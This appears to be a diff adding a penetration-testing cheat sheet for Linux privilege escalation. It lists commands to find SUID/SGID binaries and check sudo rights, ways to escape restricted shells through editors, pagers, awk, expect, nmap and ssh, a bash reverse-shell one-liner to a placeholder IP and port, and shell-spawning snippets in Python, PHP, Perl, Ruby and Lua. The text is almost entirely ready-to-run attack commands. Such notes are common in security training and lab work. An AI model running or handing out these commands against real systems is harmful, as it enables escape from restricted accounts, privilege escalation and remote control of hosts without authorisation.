@@ -1,0 +1,73 @@
+Search for Commands that run as Root:
+=====================================
+1. list all programs this account has sudo access to
+   a. sudo -l
+2. find all files with SUID & SGID set
+   a. find / -perm -4000 -o -perm -2000
+   b. find / -perm /6000
+   c. find / -perm /6001   (looks for SUID & SGID set and anyone can execute)
+3. find all files with SUID set 
+   a. find . -perm /4000 
+   b. find / -perm -u=s -type f 2>/dev/null
+4. find all files with SGID set
+   a. find . -perm /2000 
+
+Restricted Shells: rbash, rksh, rzsh, lshell and rssh
+==================
+1. try ls, cd, pwd, echo commands [if these commands are restricted, 
+   an error will show up with the type of restricted shell we are in (most of the time, this is rbash)]
+2. press tab twice to see what commands are available.
+  a. if "ls" is avaiable list binaries in /bin, /usr/bin, /usr/local/bin
+  b. echo /usr/bin/*  [use globbing to list directory contents]
+  c. important to check for operators and escape characters such as the following:
+     > >> < | & ; : ' " `
+3. Try commands wrapped
+  a. (whoami)
+  b. {whoami}
+
+
+Shell Execution:
+================
+1. find /home -exec sh -i \;
+2. use text editors vim, vi, nano, pico, ed
+  a. :!/bin/sh, !/bin/zsh, try other shells!?!?
+  b. :shell
+  c. :set shell=/bin/sh
+3. use pagers less, more, or programs like man that use less or more by default
+  a. !/bin/sh, !/bin/zsh, try other shells!?!?
+  b. !/bin/bash
+  c. !bash
+4. use awk command
+  a. awk 'BEGIN {system("/bin/sh")}'
+5. use expect command
+  a. expect
+     spwan sh
+     sh
+6. use tee command to create a script in scenarios where text editors aren't available
+  a. echo "bash -i" | tee script.sh
+7. use nmap command
+  a. nmap --interactive
+     nmap> !sh
+8. use ssh with the following options to escape restricted shell 
+  a. ssh user@IP -t "bash --noprofile"
+     ssh user@IP -t "/bin/sh"
+
+
+Reverse Shell:
+==============
+1. bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
+
+
+Programming Language:
+=====================
+1. Python:
+  a. import os; os.system("/bin/sh")
+  b. python -c ‘import pty;pty.spawn(“/bin/bash”);’
+2. PHP:
+  a. exec("sh -i");
+3. Perl:
+  a. exec "/bin/sh";
+4. Ruby:
+  a. exec "/bin/sh"
+5. Lua:
+  a. os.execute("/bin/sh")
